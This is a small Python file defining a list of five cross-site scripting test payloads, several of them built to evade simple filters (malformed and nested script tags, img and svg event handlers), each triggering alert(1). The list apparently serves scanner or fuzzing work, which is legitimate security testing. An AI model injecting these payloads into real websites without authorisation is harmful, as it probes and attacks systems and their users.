# -*- coding: utf-8 -*-


xss_dict = [
    '<img/src=1 onerror=alert(1)>',
    '<svg/onload=alert(1)',
    '<script x> alert(1) </script 1=2',
    '<script>alert(1);</script>',
    '<scrscriptipt>alert(1)</scrscriptipt>'
]
